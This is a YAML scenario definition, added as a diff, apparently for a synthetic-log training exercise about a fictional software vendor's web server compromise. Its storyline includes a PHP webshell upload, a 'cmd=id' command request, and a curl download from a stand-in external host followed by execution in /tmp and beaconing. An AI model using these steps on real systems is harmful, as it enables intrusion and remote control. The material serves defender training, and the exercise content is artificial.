@@ -1,0 +1,377 @@
+name: lantern-works-web-compromise
+description: Separate external scanner noise from a successful support-portal upload, server-side command
+  execution and an outbound foothold.
+status: published
+
+publisher: evidenceforge
+parents:
+- kind: scenario
+  publisher: evidenceforge
+  name: lantern-works-web-compromise
+  draft_id: 681c4be9-912f-4549-8bda-63e0296c02f8
+  digest: b7c7a29c94ccdd3234a872812c9df48d9f3c5c873c3646b6c54307662532f99d
+display_name: Lantern Works Software - Web Server Compromise
+schema_version: '3.0'
+composition:
+  industries:
+  - source: path
+    publisher: evidenceforge
+    name: technology
+    version: 1.0.0
+    path: ../dependencies/evidenceforge/industry/technology/1.0.0
+environment:
+  description: Lantern Works Software, a fictional small software vendor with a public support portal
+    and private database.
+  timezone:
+    default: America/New_York
+  users:
+  - username: sara.bennett
+    full_name: Sara Bennett
+    email: sara.bennett@lanternworks.example
+    persona: evidenceforge/technology:platform_engineer
+    primary_system: LW-WS-01
+    groups:
+    - Engineering
+  - username: theo.martin
+    full_name: Theo Martin
+    email: theo.martin@lanternworks.example
+    persona: evidenceforge/technology:platform_engineer
+    primary_system: LW-WS-02
+    groups:
+    - Engineering
+  - username: elena.rossi
+    full_name: Elena Rossi
+    email: elena.rossi@lanternworks.example
+    persona: developer
+    primary_system: LW-WS-03
+    groups:
+    - Engineering
+  - username: omar.rahman
+    full_name: Omar Rahman
+    email: omar.rahman@lanternworks.example
+    persona: sysadmin
+    primary_system: LW-WS-04
+    groups:
+    - Engineering
+  systems:
+  - hostname: LW-WS-01
+    ip: 10.64.10.21
+    os: Linux Ubuntu 24.04
+    roles:
+    - workstation
+    type: workstation
+    services:
+    - ssh
+    assigned_user: sara.bennett
+  - hostname: LW-WS-02
+    ip: 10.64.10.22
+    os: Linux Ubuntu 24.04
+    roles:
+    - workstation
+    type: workstation
+    services:
+    - ssh
+    assigned_user: theo.martin
+  - hostname: LW-WS-03
+    ip: 10.64.10.23
+    os: Linux Ubuntu 24.04
+    roles:
+    - workstation
+    type: workstation
+    services:
+    - ssh
+    assigned_user: elena.rossi
+  - hostname: LW-WS-04
+    ip: 10.64.10.24
+    os: Linux Ubuntu 24.04
+    roles:
+    - workstation
+    type: workstation
+    services:
+    - ssh
+    assigned_user: omar.rahman
+  - hostname: LW-WEB-01
+    ip: 203.0.113.44
+    os: Linux Ubuntu 24.04
+    roles:
+    - web_server
+    - app_server
+    type: server
+    services:
+    - nginx
+    - php-fpm
+    - ssh
+    public_hostnames:
+    - support.lanternworks.example
+  - hostname: LW-DB-01
+    ip: 10.64.20.20
+    os: Linux Ubuntu 24.04
+    roles:
+    - database
+    type: server
+    services:
+    - postgresql
+    - ssh
+  service_accounts:
+  - www-data
+  groups:
+  - name: Engineering
+    members:
+    - sara.bennett
+    - theo.martin
+    - elena.rossi
+    - omar.rahman
+  network:
+    segments:
+    - name: engineering
+      cidr: 10.64.10.0/24
+      exposure: internal
+    - name: database
+      cidr: 10.64.20.0/24
+      exposure: internal
+    - name: public-dmz
+      cidr: 203.0.113.0/25
+      exposure: both
+    sensors:
+    - type: network
+      name: lantern-core-span
+      monitoring_segments: &id001
+      - engineering
+      - database
+      - public-dmz
+      placement: span
+      log_formats:
+      - zeek
+    - type: ids
+      name: lantern-ids
+      monitoring_segments: *id001
+      placement: span
+      log_formats:
+      - snort_alert
+    public_cidrs:
+    - 203.0.113.0/25
+  network_identities:
+  - id: support-portal
+    hosts:
+    - support.lanternworks.example
+    ips:
+    - 203.0.113.44
+    tags: []
+    dns: true
+  - id: external-client
+    hosts:
+    - client-77.access-node.example
+    ips:
+    - 198.51.100.77
+    tags: []
+    dns: true
+  - id: cache-status
+    hosts:
+    - status.artifact-cache.example
+    ips:
+    - 198.51.100.78
+    tags: []
+    dns: true
+time_window:
+  start: '2026-11-09T14:00:00Z'
+  duration: 6h
+  warmup: 1h
+baseline_activity:
+  description: Normal business activity mixed with routine administration.
+  intensity: medium
+  variation: high
+  suspicious_noise: low
+output:
+  logs:
+  - format: zeek
+  - format: ecar
+  - format: syslog
+  - format: bash_history
+  - format: web_access
+  - format: snort_alert
+  destination: ./output
+  compression: false
+release_notes: Initial bundled training example.
+generation_seed: 6401
+observation_profile: complete
+storyline:
+- id: web-enumeration
+  time: +45m
+  actor: www-data
+  system: LW-WEB-01
+  activity: An external client enumerates support-portal paths with a directory scanner.
+  events:
+  - type: web_scan
+    source_ip: 198.51.100.77
+    dst_ip: 203.0.113.44
+    hostname: support.lanternworks.example
+    dst_port: 80
+    preset: gobuster
+    rate: 1.4
+    count: 95
+    jitter: 0.45
+    ids_alerts:
+    - sid: 2002910
+- id: upload-rejected
+  time: +1h5m
+  actor: www-data
+  system: LW-WEB-01
+  activity: An upload without the required filename extension is rejected.
+  events:
+  - type: connection
+    source_ip: 198.51.100.77
+    dst_ip: 203.0.113.44
+    dst_port: 80
+    hostname: support.lanternworks.example
+    service: http
+    method: POST
+    uri: /support/upload.php
+    status_code: 403
+    request_body_len: 310
+    response_body_len: 82
+- id: webshell-upload
+  time: +1h8m
+  actor: www-data
+  system: LW-WEB-01
+  activity: A vulnerable attachment handler accepts a server-side script in the upload directory.
+  events:
+  - type: connection
+    source_ip: 198.51.100.77
+    dst_ip: 203.0.113.44
+    dst_port: 80
+    hostname: support.lanternworks.example
+    service: http
+    method: POST
+    uri: /support/upload.php
+    status_code: 201
+    request_multipart:
+      parts:
+      - name: attachment
+        filename: status.php
+        body_len: 512
+        content_type: application/x-php
+    response_body_len: 78
+    ids_alerts:
+    - sid: 2012647
+    technique: T1505.003
+- id: php-worker
+  time: +1h9m
+  actor: www-data
+  system: LW-WEB-01
+  activity: The PHP worker services the uploaded script.
+  events:
+  - type: process
+    process_name: /usr/sbin/php-fpm8.3
+    command_line: 'php-fpm: pool www'
+    process_ref: php-worker
+- id: command-request
+  time: +1h10m
+  actor: www-data
+  system: LW-WEB-01
+  activity: The external client requests command execution through the uploaded script.
+  events:
+  - type: connection
+    source_ip: 198.51.100.77
+    dst_ip: 203.0.113.44
+    dst_port: 80
+    hostname: support.lanternworks.example
+    service: http
+    method: GET
+    uri: /uploads/status.php?cmd=id
+    status_code: 200
+    response_body_len: 54
+- id: web-process-execution
+  time: +1h10m2s
+  actor: www-data
+  system: LW-WEB-01
+  activity: The web worker creates a command shell and queries its service identity.
+  events:
+  - type: process
+    process_name: /bin/sh
+    command_line: /bin/sh -c id
+    process_ref: web-shell
+    parent_ref: php-worker
+  - type: process
+    process_name: /usr/bin/id
+    command_line: id
+    parent_ref: web-shell
+- id: host-discovery
+  time: +1h13m
+  actor: www-data
+  system: LW-WEB-01
+  activity: The foothold checks the kernel and host identity.
+  events:
+  - type: process
+    process_name: /usr/bin/uname
+    command_line: uname -a
+    parent_ref: php-worker
+- id: payload-fetch
+  time: +1h17m
+  actor: www-data
+  system: LW-WEB-01
+  activity: A command-line client retrieves a secondary Linux helper from external infrastructure.
+  events:
+  - type: process
+    process_name: /usr/bin/curl
+    command_line: curl -fsS http://status.artifact-cache.example/dist/cache-maint -o /tmp/cache-maint
+    parent_ref: php-worker
+  - type: connection
+    dst_ip: 198.51.100.78
+    dst_port: 80
+    hostname: status.artifact-cache.example
+    service: http
+    method: GET
+    uri: /dist/cache-maint
+    user_agent: curl/8.5.0
+    response_body_len: 49152
+    status_code: 200
+- id: helper-execution
+  time: +1h19m
+  actor: www-data
+  system: LW-WEB-01
+  activity: The helper is made executable and started under the compromised web service account.
+  events:
+  - type: process
+    process_name: /usr/bin/chmod
+    command_line: chmod 700 /tmp/cache-maint
+    parent_ref: php-worker
+  - type: process
+    process_name: /tmp/cache-maint
+    command_line: /tmp/cache-maint --mode service
+    process_ref: linux-agent
+    parent_ref: php-worker
+- id: sparse-callback
+  time: +1h20m
+  actor: www-data
+  system: LW-WEB-01
+  activity: The new helper makes sparse encrypted callbacks.
+  events:
+  - type: beacon
+    dst_ip: 198.51.100.78
+    hostname: status.artifact-cache.example
+    dst_port: 443
+    service: ssl
+    profile: sparse_poll
+    interval: 4m
+    duration: 42m
+    jitter: 0.3
+red_herrings:
+- id: approved-web-audit
+  time: +3h
+  actor: omar.rahman
+  system: LW-WEB-01
+  activity: The administrator runs an approved web audit from the management workstation.
+  events:
+  - type: web_scan
+    source_ip: 10.64.10.24
+    dst_ip: 203.0.113.44
+    hostname: support.lanternworks.example
+    dst_port: 80
+    preset: nikto
+    rate: 0.4
+    count: 45
+    jitter: 0.5
+  explanation: An approved scanner produces conspicuous request patterns but lacks the accepted upload,
+    command request and web-worker child chain.
+scenario_version: 1.0.0
+configuration_context: ../configuration/context.yaml
